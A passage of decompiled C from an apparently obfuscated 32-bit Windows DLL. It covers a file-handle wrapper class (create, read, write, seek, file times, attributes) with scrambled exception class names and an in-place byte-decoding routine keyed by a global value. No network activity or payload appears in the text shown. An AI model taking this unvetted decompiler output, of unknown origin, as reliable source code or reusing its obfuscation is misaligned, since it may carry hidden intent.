    j__free(Block);
  return Block;
}

//----- (1000BB54) --------------------------------------------------------
void __thiscall sub_1000BB54(int this)
{
  _DWORD v2[5]; // [esp+0h] [ebp-20h] BYREF
  int v3; // [esp+1Ch] [ebp-4h]

  v2[4] = v2;
  v2[3] = this;
  *(_DWORD *)this = &off_10102310;
  v3 = 2;
  if ( *(_DWORD *)(this + 4) != -1 )
    sub_1000BCEA((HANDLE *)this);
  v3 = 0;
  sub_10007D7A((void **)(this + 20));
  v3 = -1;
  sub_1000D3AD((int *)(this + 8));
}
// 10102310: using guessed type int (__thiscall *off_10102310)(void *Block, char);

//----- (1000BBC2) --------------------------------------------------------
char __thiscall sub_1000BBC2(_DWORD *this)
{
  HANDLE FileW; // eax
  bool v3; // bl
  DWORD v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v9; // [esp+0h] [ebp-60h] BYREF
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-54h] BYREF
  int v11[4]; // [esp+1Ch] [ebp-44h] BYREF
  int v12[4]; // [esp+2Ch] [ebp-34h] BYREF
  _DWORD v13[6]; // [esp+3Ch] [ebp-24h] BYREF
  int v14; // [esp+5Ch] [ebp-4h]

  v13[5] = &v9;
  LOBYTE(FileW) = (*(int (__thiscall **)(_DWORD *))(*this + 12))(this);
  if ( !(_BYTE)FileW )
  {
    v3 = sub_10014AF7((int)(this + 2));
    FileW = CreateFileW(
              *(LPCWSTR *)(this[3] + 12),
              this[4],
              this[8],
              *(LPSECURITY_ATTRIBUTES *)(this[5] + 4),
              this[9],
              this[7],
              0);
    if ( FileW == (HANDLE)-1 )
    {
      v4 = GetLastError() - 2;
      if ( v4 )
      {
        if ( v4 != 78 )
        {
          v5 = sub_100145B3(v12, 1);
          v14 = 2;
          sub_1000C948(v5, 124);
        }
        v6 = sub_100146C0(v13);
        v14 = 0;
        sub_1000C9BE(pExceptionObject, v6, 1);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__);
      }
      v7 = sub_100146C0(v11);
      v14 = 1;
      sub_1000C923(v7, 121);
    }
    this[1] = FileW;
    if ( !v3 )
    {
      LOBYTE(FileW) = (unsigned __int8)sub_100147E7();
      if ( dword_1017A020 >= 9 )
      {
        v14 = 3;
        LOBYTE(FileW) = sub_10014C6C((int)(this + 2));
      }
    }
  }
  return (char)FileW;
}
// 1017A020: using guessed type int dword_1017A020;
// 1000BBC2: using guessed type int var_34[4];
// 1000BBC2: using guessed type _DWORD pExceptionObject[4];
// 1000BBC2: using guessed type int var_44[4];

//----- (1000BCC4) --------------------------------------------------------
void __thiscall sub_1000BCC4(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_1001468F(this + 3);
  sub_1000E843(v1);
}

//----- (1000BCD7) --------------------------------------------------------
void __thiscall sub_1000BCD7(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_10014635(this + 3);
  sub_1000E843(v1);
}

//----- (1000BCEA) --------------------------------------------------------
int __thiscall sub_1000BCEA(HANDLE *this)
{
  int result; // eax
  _DWORD *v3; // eax
  _DWORD v4[8]; // [esp+8h] [ebp-20h] BYREF

  result = (*((int (__thiscall **)(HANDLE *))*this + 3))(this);
  if ( (_BYTE)result )
  {
    result = CloseHandle(this[1]);
    if ( !result )
    {
      v3 = sub_100145B3(v4, 1);
      v4[7] = 0;
      sub_1000C948(v3, 162);
    }
    this[1] = (HANDLE)-1;
  }
  return result;
}

//----- (1000BD52) --------------------------------------------------------
BOOL __thiscall sub_1000BD52(_DWORD *this)
{
  return this[1] != -1;
}

//----- (1000BD5C) --------------------------------------------------------
char *__thiscall sub_1000BD5C(char *this)
{
  return this + 8;
}

//----- (1000BD60) --------------------------------------------------------
LONG *__thiscall sub_1000BD60(_DWORD *this, LONG *a2)
{
  DWORD FullPathNameW; // ebx
  _DWORD *v4; // eax
  WCHAR *v5; // eax
  DWORD v6; // edi
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD v10[4]; // [esp+Ch] [ebp-2Ch] BYREF
  LPCWSTR lpFileName; // [esp+1Ch] [ebp-1Ch] BYREF
  LPWSTR FilePart; // [esp+20h] [ebp-18h] BYREF
  int v13; // [esp+24h] [ebp-14h]
  WCHAR Buffer; // [esp+28h] [ebp-10h] BYREF
  int v15; // [esp+34h] [ebp-4h]

  v15 = 0;
  v13 = 0;
  FullPathNameW = GetFullPathNameW(*(LPCWSTR *)(this[3] + 12), 0, &Buffer, &FilePart);
  if ( !FullPathNameW )
  {
    v4 = sub_100145B3(v10, 1);
    v15 = 1;
    sub_1000C948(v4, 193);
  }
  sub_1000D1D6(a2, FullPathNameW + 2);
  v15 = 0;
  lpFileName = *(LPCWSTR *)(this[3] + 12);
  v13 = 1;
  v5 = (WCHAR *)sub_1000D679(a2);
  v6 = GetFullPathNameW(lpFileName, FullPathNameW, v5, &FilePart);
  sub_1000D6AC((int)a2);
  if ( !v6 )
  {
    v7 = sub_100145B3(v10, 1);
    v15 = 2;
    sub_1000C948(v7, 204);
  }
  if ( v6 > FullPathNameW + 1 )
  {
    v8 = sub_1000E7F7(&lpFileName, 1, 0);
    v15 = 3;
    sub_10007882((int)v8);
  }
  return a2;
}
// 1000BD60: using guessed type _DWORD var_2C[4];

//----- (1000BE40) --------------------------------------------------------
_DWORD *__thiscall sub_1000BE40(_DWORD *this, _DWORD *a2)
{
  volatile LONG *v3; // [esp-4h] [ebp-18h]

  a2[1] = this[6];
  v3 = (volatile LONG *)a2[1];
  *a2 = this[5];
  InterlockedIncrement(v3);
  return a2;
}

//----- (1000BE83) --------------------------------------------------------
int __thiscall sub_1000BE83(_DWORD *this)
{
  return this[8];
}

//----- (1000BE87) --------------------------------------------------------
int __thiscall sub_1000BE87(_DWORD *this)
{
  return this[9];
}

//----- (1000BE8B) --------------------------------------------------------
int __userpurge sub_1000BE8B@<eax>(
        HANDLE *a1@<esi>,
        FILETIME *lpCreationTime,
        FILETIME *lpLastAccessTime,
        FILETIME *lpLastWriteTime)
{
  char v4; // al
  bool v5; // bl
  int result; // eax
  int v7; // edi
  _DWORD *v8; // eax
  _DWORD v9[7]; // [esp+8h] [ebp-1Ch] BYREF

  v4 = (*((int (__thiscall **)(HANDLE *))*a1 + 3))(a1);
  v5 = v4 == 0;
  if ( !v4 )
    (*((void (__thiscall **)(HANDLE *))*a1 + 1))(a1);
  result = SetFileTime(a1[1], lpCreationTime, lpLastAccessTime, lpLastWriteTime);
  v7 = result;
  if ( v5 )
    result = (*((int (__thiscall **)(HANDLE *))*a1 + 2))(a1);
  if ( !v7 )
  {
    v8 = sub_100145B3(v9, 1);
    v9[6] = 0;
    sub_1000C948(v8, 253);
  }
  return result;
}

//----- (1000BEFE) --------------------------------------------------------
_QWORD *__thiscall sub_1000BEFE(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  FILETIME FileTime; // [esp+8h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+10h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+18h] [ebp-8h] BYREF

  sub_1000C301(this, &v8, &v7, &FileTime);
  v3 = sub_1000C407(&FileTime, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (1000BF3F) --------------------------------------------------------
int __thiscall sub_1000BF3F(HANDLE *this, FILETIME *lpFileTime, int a3)
{
  FILETIME CreationTime; // [esp+10h] [ebp-20h] BYREF
  FILETIME LastWriteTime; // [esp+18h] [ebp-18h] BYREF
  FILETIME LastAccessTime; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_1000C301(this, &LastAccessTime, &LastWriteTime, &v8);
  CreationTime = sub_1000C407(lpFileTime, a3, 1);
  return sub_1000BE8B(this, &CreationTime, &LastAccessTime, &LastWriteTime);
}

//----- (1000BF90) --------------------------------------------------------
_QWORD *__thiscall sub_1000BF90(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  FILETIME FileTime; // [esp+8h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+10h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+18h] [ebp-8h] BYREF

  sub_1000C301(this, &v8, &FileTime, &v7);
  v3 = sub_1000C407(&FileTime, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (1000BFCF) --------------------------------------------------------
int __thiscall sub_1000BFCF(HANDLE *this, FILETIME *lpFileTime, int a3)
{
  FILETIME LastWriteTime; // [esp+10h] [ebp-20h] BYREF
  FILETIME LastAccessTime; // [esp+18h] [ebp-18h] BYREF
  FILETIME CreationTime; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_1000C301(this, &LastAccessTime, &v8, &CreationTime);
  LastWriteTime = sub_1000C407(lpFileTime, a3, 1);
  return sub_1000BE8B(this, &CreationTime, &LastAccessTime, &LastWriteTime);
}

//----- (1000C022) --------------------------------------------------------
_QWORD *__thiscall sub_1000C022(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  FILETIME FileTime; // [esp+8h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+10h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+18h] [ebp-8h] BYREF

  sub_1000C301(this, &FileTime, &v8, &v7);
  v3 = sub_1000C407(&FileTime, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (1000C061) --------------------------------------------------------
int __thiscall sub_1000C061(HANDLE *this, FILETIME *lpFileTime, int a3)
{
  FILETIME LastAccessTime; // [esp+10h] [ebp-20h] BYREF
  FILETIME LastWriteTime; // [esp+18h] [ebp-18h] BYREF
  FILETIME CreationTime; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_1000C301(this, &v8, &LastWriteTime, &CreationTime);
  LastAccessTime = sub_1000C407(lpFileTime, a3, 1);
  return sub_1000BE8B(this, &CreationTime, &LastAccessTime, &LastWriteTime);
}

//----- (1000C0B4) --------------------------------------------------------
DWORD __thiscall sub_1000C0B4(HANDLE *this)
{
  int v2; // eax
  HANDLE FirstFileW; // eax
  _DWORD *v4; // eax
  DWORD dwFileAttributes; // esi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD v9[4]; // [esp+4h] [ebp-2A4h] BYREF
  struct _BY_HANDLE_FILE_INFORMATION FileInformation; // [esp+14h] [ebp-294h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+48h] [ebp-260h] BYREF
  int v12; // [esp+2A4h] [ebp-4h]

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    if ( !GetFileInformationByHandle(this[1], &FileInformation) )
    {
      v7 = sub_100145B3(v9, 1);
      v12 = 2;
      sub_1000C948(v7, 355);
    }
    dwFileAttributes = FileInformation.dwFileAttributes;
  }
  else
  {
    v2 = (*((int (__thiscall **)(HANDLE *))*this + 5))(this);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      v4 = sub_100146C0(v9);
      v12 = 0;
      sub_1000C923(v4, 340);
    }
    dwFileAttributes = FindFileData.dwFileAttributes;
    if ( !FindClose(FirstFileW) )
    {
      v6 = sub_100145B3(v9, 1);
      v12 = 1;
      sub_1000C948(v6, 348);
    }
  }
  if ( dwFileAttributes == 128 )
    return 0;
  return dwFileAttributes;
}
// 1000C0B4: using guessed type _DWORD var_2A4[4];

//----- (1000C19E) --------------------------------------------------------
BOOL __thiscall sub_1000C19E(void *this, DWORD dwFileAttributes)
{
  int v2; // eax
  BOOL result; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD v6[5]; // [esp+0h] [ebp-20h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  result = SetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), dwFileAttributes);
  if ( !result )
  {
    if ( GetLastError() == 2 )
    {
      v4 = sub_100146C0(v6);
      v7 = 0;
      sub_1000C923(v4, 376);
    }
    v5 = sub_100145B3(v6, 1);
    v7 = 1;
    sub_1000C948(v5, 378);
  }
  return result;
}
// 1000C19E: using guessed type _DWORD var_20[5];

//----- (1000C225) --------------------------------------------------------
DWORD __thiscall sub_1000C225(HANDLE *this)
{
  int v2; // eax
  HANDLE FirstFileW; // eax
  _DWORD *v4; // eax
  DWORD FileSize; // esi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-270h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-260h] BYREF
  int v11; // [esp+274h] [ebp-4h]

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    FileSize = GetFileSize(this[1], 0);
    if ( FileSize == -1 )
    {
      v7 = sub_100145B3(v9, 1);
      v11 = 2;
      sub_1000C948(v7, 410);
    }
  }
  else
  {
    v2 = (*((int (__thiscall **)(HANDLE *))*this + 5))(this);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      v4 = sub_100146C0(v9);
      v11 = 0;
      sub_1000C923(v4, 393);
    }
    FileSize = FindFileData.nFileSizeLow;
    if ( !FindClose(FirstFileW) )
    {
      v6 = sub_100145B3(v9, 1);
      v11 = 1;
      sub_1000C948(v6, 402);
    }
  }
  return FileSize;
}
// 1000C225: using guessed type _DWORD var_270[4];

//----- (1000C301) --------------------------------------------------------
BOOL __userpurge sub_1000C301@<eax>(
        HANDLE *a1@<ecx>,
        struct _FILETIME *a2@<ebx>,
        struct _FILETIME *a3@<edi>,
        struct _FILETIME *lpCreationTime)
{
  int v5; // eax
  HANDLE FirstFileW; // eax
  _DWORD *v7; // eax
  BOOL result; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD v11[4]; // [esp+8h] [ebp-270h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-260h] BYREF
  int v13; // [esp+274h] [ebp-4h]

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*a1 + 3))(a1) )
  {
    result = GetFileTime(a1[1], lpCreationTime, a2, a3);
    if ( !result )
    {
      v10 = sub_100145B3(v11, 1);
      v13 = 2;
      sub_1000C948(v10, 444);
    }
  }
  else
  {
    v5 = (*((int (__thiscall **)(HANDLE *))*a1 + 5))(a1);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v5 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      v7 = sub_100146C0(v11);
      v13 = 0;
      sub_1000C923(v7, 427);
    }
    *lpCreationTime = FindFileData.ftCreationTime;
    *a2 = FindFileData.ftLastAccessTime;
    *a3 = FindFileData.ftLastWriteTime;
    result = FindClose(FirstFileW);
    if ( !result )
    {
      v9 = sub_100145B3(v11, 1);
      v13 = 1;
      sub_1000C948(v9, 437);
    }
  }
  return result;
}
// 1000C301: using guessed type _DWORD var_270[4];

//----- (1000C407) --------------------------------------------------------
struct _FILETIME __cdecl sub_1000C407(FILETIME *lpFileTime, int a2, int a3)
{
  BOOL v3; // eax
  bool v4; // cl
  DWORD dwHighDateTime; // eax
  _DWORD *v6; // eax
  int v8[4]; // [esp+0h] [ebp-24h] BYREF
  struct _FILETIME LocalFileTime; // [esp+10h] [ebp-14h] BYREF
  int v10; // [esp+20h] [ebp-4h]

  if ( a2 == 1 )
  {
    if ( !a3 )
    {
      v3 = FileTimeToLocalFileTime(lpFileTime, &LocalFileTime);
LABEL_7:
      v4 = v3;
      goto LABEL_9;
    }
  }
  else if ( !a2 && a3 == 1 )
  {
    v3 = LocalFileTimeToFileTime(lpFileTime, &LocalFileTime);
    goto LABEL_7;
  }
  dwHighDateTime = lpFileTime->dwHighDateTime;
  v4 = 1;
  LocalFileTime.dwLowDateTime = lpFileTime->dwLowDateTime;
  LocalFileTime.dwHighDateTime = dwHighDateTime;
LABEL_9:
  if ( !v4 )
  {
    v6 = sub_100145B3(v8, 1);
    v10 = 0;
    sub_1000C948(v6, 463);
  }
  return LocalFileTime;
}
// 1000C407: using guessed type int var_24[4];

//----- (1000C48B) --------------------------------------------------------
__int16 __thiscall sub_1000C48B(void *this)
{
  int v2; // ecx
  __int16 v3; // si
  int v5[5]; // [esp+8h] [ebp-20h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  sub_1000B1F3((void *)1, (int)v5, 0);
  v6 = 0;
  if ( (*(int (__thiscall **)(void *, int *))(*(_DWORD *)this + 48))(this, v5) == 1 )
    v3 = *(unsigned __int8 *)sub_1000B4CB((int)v5, v2, 0);
  else
    v3 = -1;
  v6 = -1;
  sub_1000B3DF(v5);
  return v3;
}
// 1000C4E3: variable 'v2' is possibly undefined
// 1000C48B: using guessed type int var_20[5];

//----- (1000C4F4) --------------------------------------------------------
DWORD __thiscall sub_1000C4F4(HANDLE *this, _DWORD *a2)
{
  DWORD v2; // ebx
  unsigned __int8 (__thiscall **v4)(HANDLE *); // eax
  int v5; // ecx
  _DWORD *v6; // eax
  DWORD result; // eax
  int v8; // eax
  char v9; // bl
  void *v10; // eax
  BOOL v11; // eax
  _DWORD *v12; // eax
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-28h] BYREF
  DWORD nNumberOfBytesToRead; // [esp+14h] [ebp-24h]
  _DWORD v15[5]; // [esp+18h] [ebp-20h] BYREF
  int v16; // [esp+34h] [ebp-4h]

  v2 = a2[3];
  v4 = (unsigned __int8 (__thiscall **)(HANDLE *))*this;
  nNumberOfBytesToRead = v2;
  if ( !v4[3](this) )
  {
    v6 = sub_100146C0(v15);
    v16 = 0;
    sub_1000C96D(v6, 489);
  }
  if ( !v2 )
    return 0;
  v8 = a2[1];
  NumberOfBytesRead = 0;
  v9 = *(_BYTE *)(v8 + 8);
  v10 = (void *)sub_1000B49B(a2, v5);
  v11 = ReadFile(this[1], v10, nNumberOfBytesToRead, &NumberOfBytesRead, 0);
  if ( v9 )
    *(_BYTE *)(a2[1] + 8) = 1;
  if ( !v11 )
  {
    v12 = sub_100145B3(v15, 1);
    v16 = 1;
    sub_1000C948(v12, 507);
  }
  result = NumberOfBytesRead;
  if ( !NumberOfBytesRead )
    return -1;
  return result;
}
// 1000C559: variable 'v5' is possibly undefined
// 1000C4F4: using guessed type _DWORD var_20[5];

//----- (1000C5BE) --------------------------------------------------------
void __thiscall sub_1000C5BE(void *this, char a2)
{
  int v3[5]; // [esp+8h] [ebp-20h] BYREF
  int v4; // [esp+24h] [ebp-4h]

  sub_1000B1F3((void *)1, (int)v3, &a2);
  v4 = 0;
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 56))(this, v3);
  v4 = -1;
  sub_1000B3DF(v3);
}
// 1000C5BE: using guessed type int var_20[5];

//----- (1000C60A) --------------------------------------------------------
int __thiscall sub_1000C60A(HANDLE *this, _DWORD *a2)
{
  DWORD v3; // edi
  int result; // eax
  _DWORD *v5; // eax
  const void *v6; // eax
  _DWORD *v7; // eax
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-24h] BYREF
  _DWORD v9[5]; // [esp+10h] [ebp-20h] BYREF
  int v10; // [esp+2Ch] [ebp-4h]

  v3 = a2[3];
  result = (*((int (__thiscall **)(HANDLE *))*this + 3))(this);
  if ( !(_BYTE)result )
  {
    v5 = sub_100146C0(v9);
    v10 = 0;
    sub_1000C96D(v5, 533);
  }
  if ( v3 )
  {
    NumberOfBytesWritten = 0;
    v6 = (const void *)sub_1000B4B8(a2);
    result = WriteFile(this[1], v6, v3, &NumberOfBytesWritten, 0);
    if ( !result || NumberOfBytesWritten != v3 )
    {
      v7 = sub_100145B3(v9, 1);
      v10 = 1;
      sub_1000C948(v7, 548);
    }
  }
  return result;
}
// 1000C60A: using guessed type _DWORD var_20[5];

//----- (1000C6B3) --------------------------------------------------------
int __thiscall sub_1000C6B3(void *this, int a2, int a3)
{
  return (*(int (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 68))(this, a2, a2 >> 31, a3);
}

//----- (1000C6CA) --------------------------------------------------------
DWORD __thiscall sub_1000C6CA(HANDLE *this, LONG lDistanceToMove, int a3, DWORD dwMoveMethod)
{
  _DWORD *v5; // eax
  DWORD result; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  LONG DistanceToMoveHigh; // [esp+Ch] [ebp-24h] BYREF
  _DWORD v10[5]; // [esp+10h] [ebp-20h] BYREF
  int v11; // [esp+2Ch] [ebp-4h]

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    v5 = sub_100146C0(v10);
    v11 = 0;
    sub_1000C96D(v5, 562);
  }
  DistanceToMoveHigh = a3;
  result = SetFilePointer(this[1], lDistanceToMove, &DistanceToMoveHigh, dwMoveMethod);
  if ( result == -1 )
  {
    if ( GetLastError() == 131 )
    {
      v7 = sub_100146C0(v10);
      v11 = 1;
      sub_1000C992(v7);
    }
    v8 = sub_100145B3(v10, 1);
    v11 = 2;
    sub_1000C948(v8, 577);
  }
  return result;
}
// 1000C6CA: using guessed type _DWORD var_20[5];

//----- (1000C785) --------------------------------------------------------
DWORD __thiscall sub_1000C785(HANDLE *this)
{
  _DWORD *v2; // eax
  DWORD result; // eax
  _DWORD *v4; // eax
  LONG DistanceToMoveHigh; // [esp+Ch] [ebp-24h] BYREF
  _DWORD v6[5]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    v2 = sub_100146C0(v6);
    v7 = 0;
    sub_1000C96D(v2, 586);
  }
  DistanceToMoveHigh = 0;
  result = SetFilePointer(this[1], 0, &DistanceToMoveHigh, 1u);
  if ( result == -1 )
  {
    v4 = sub_100145B3(v6, 1);
    v7 = 1;
    sub_1000C948(v4, 599);
  }
  return result;
}
// 1000C785: using guessed type _DWORD var_20[5];

//----- (1000C822) --------------------------------------------------------
int __thiscall sub_1000C822(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 72))(this);
}

//----- (1000C827) --------------------------------------------------------
BOOL __thiscall sub_1000C827(HANDLE *this)
{
  _DWORD *v2; // eax
  BOOL result; // eax
  _DWORD *v4; // eax
  _DWORD v5[5]; // [esp+8h] [ebp-20h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    v2 = sub_100146C0(v5);
    v6 = 0;
    sub_1000C96D(v2, 616);
  }
  result = FlushFileBuffers(this[1]);
  if ( !result )
  {
    v4 = sub_100145B3(v5, 1);
    v6 = 1;
    sub_1000C948(v4, 622);
  }
  return result;
}
// 1000C827: using guessed type _DWORD var_20[5];

//----- (1000C8A5) --------------------------------------------------------
BOOL __thiscall sub_1000C8A5(HANDLE *this)
{
  _DWORD *v2; // eax
  BOOL result; // eax
  _DWORD *v4; // eax
  _DWORD v5[5]; // [esp+8h] [ebp-20h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    v2 = sub_100146C0(v5);
    v6 = 0;
    sub_1000C96D(v2, 630);
  }
  result = SetEndOfFile(this[1]);
  if ( !result )
  {
    v4 = sub_100145B3(v5, 1);
    v6 = 1;
    sub_1000C948(v4, 636);
  }
  return result;
}
// 1000C8A5: using guessed type _DWORD var_20[5];

//----- (1000C923) --------------------------------------------------------
void __cdecl __noreturn sub_1000C923(_DWORD *a1, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  sub_1000C9BE(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
}
// 1000C923: using guessed type _DWORD pExceptionObject[4];

//----- (1000C948) --------------------------------------------------------
void __cdecl __noreturn sub_1000C948(_DWORD *a1, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  sub_1000CA3E(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
}
// 1000C948: using guessed type _DWORD pExceptionObject[4];

//----- (1000C96D) --------------------------------------------------------
void __cdecl __noreturn sub_1000C96D(_DWORD *a1, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  sub_1000C9BE(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__);
}
// 1000C96D: using guessed type _DWORD pExceptionObject[4];

//----- (1000C992) --------------------------------------------------------
void __cdecl __noreturn sub_1000C992(_DWORD *a1)
{
  _DWORD pExceptionObject[6]; // [esp+4h] [ebp-18h] BYREF

  pExceptionObject[4] = 575;
  sub_1000C9BE(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__);
}

//----- (1000C9BE) --------------------------------------------------------
_DWORD *__thiscall sub_1000C9BE(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_101022FC;
    this[2] = &unk_10102930;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 3, v4);
  }
  sub_1000CA3E(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10102304;
  return this;
}
// 10102304: using guessed type int (__stdcall *off_10102304)(char);

//----- (1000CA3E) --------------------------------------------------------
_DWORD *__thiscall sub_1000CA3E(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_101022FC;
    this[2] = &unk_10102930;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 3, v4);
  }
  sub_1000AA0A(this, a2, 0);
  sub_1000CADA(this + 2, a2 != 0 ? (unsigned int)(a2 + 2) : 0, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_101022F4;
  return this;
}
// 101022F4: using guessed type int (__stdcall *off_101022F4)(char);

//----- (1000CADA) --------------------------------------------------------
_DWORD *__thiscall sub_1000CADA(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10102930;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 1, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_101022EC;
  return this;
}
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);

//----- (1000CB43) --------------------------------------------------------
char *__thiscall sub_1000CB43(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_1000BCD7(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000CB65) --------------------------------------------------------
char *__thiscall sub_1000CB65(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_1000CBA9(this - 1);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000CB87) --------------------------------------------------------
char *__thiscall sub_1000CB87(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_1000BCC4(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000CBA9) --------------------------------------------------------
void __thiscall sub_1000CBA9(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 1;
  *(_DWORD *)((char *)v2 + v1 - 4) = &off_101022EC;
  sub_1000E843(v2);
}
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);

//----- (1000CBBE) --------------------------------------------------------
int __usercall sub_1000CBBE@<eax>(int result@<eax>, int a2@<edx>)
{
  _BYTE *v2; // esi
  int v3; // edi

  v2 = (_BYTE *)result;
  if ( a2 )
  {
    v3 = 11 - result;
    do
    {
      result = dword_101863EC + (_DWORD)&v2[v3] * (_DWORD)&v2[v3 + 12];
      *v2 -= result ^ ((unsigned __int16)(dword_101863EC + (v3 + (_WORD)v2) * (v3 + (_WORD)v2 + 12)) >> 8) ^ BYTE2(result) ^ HIBYTE(result);
      ++v2;
      --a2;
    }
    while ( a2 );
  }
  return result;
}
// 101863EC: using guessed type int dword_101863EC;

//----- (1000CBFA) --------------------------------------------------------
int __cdecl sub_1000CBFA(int a1)
{
  int result; // eax
  int v3; // edx
  int v4; // [esp+14h] [ebp+8h]

